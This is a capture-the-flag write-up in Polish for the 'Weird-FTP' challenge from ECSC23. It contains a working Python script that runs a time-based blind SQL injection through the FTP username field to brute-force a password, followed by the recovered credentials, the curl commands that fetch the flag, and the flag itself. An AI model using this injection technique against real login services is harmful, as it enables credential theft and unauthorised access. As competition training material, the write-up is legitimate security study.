# Weird-FTP - web

![](../images/ebcb5a51-3da6-44d8-8b7c-73a7b1b1e249.png)

Pole username'a jest vulnerable na blind SQLi, dlatego można zbruteforceować hasło, które jest tylko złożone z cyfr.

```python=
from datetime import datetime
import os
import string
from time import sleep


passwd = ""
i = 1
while True:
    for c in string.digits:
        st = datetime.now().timestamp()
        os.system(f"""curl "ftp://boss'%20AND%20IF(SUBSTRING(password%2C1%2C{i})%3D'{passwd}{c}'%2CSLEEP(2)%2C'a')%3B%20--%20:1@ftp.ecsc23.hack.cert.pl:5005/" -vvvv 1> /dev/null 2>&1""")

        print(datetime.now().timestamp() - st)

        if datetime.now().timestamp() - st > 1.95:
            passwd += c
            i += 1
            print(f"found: {c=}, {passwd=}")
            break
        sleep(1)
    else:
        print("passwd:", passwd)
        exit(0)
```

Hasło dla konta `boss`: `7897812918028196`

```shell=
~/s/c/h/weird-ftp: curl ftp://boss:7897812918028196@ftp.ecsc23.hack.cert.pl:5005/
-rw-r--r--   1 root     root           41 Jul 14 11:31 flag.txt
~/s/c/h/weird-ftp: curl ftp://boss:7897812918028196@ftp.ecsc23.hack.cert.pl:5005/flag.txt
ecsc23{863b2b472ee544109a7b066256df0ea5}
```

Flag: `ecsc23{863b2b472ee544109a7b066256df0ea5}`
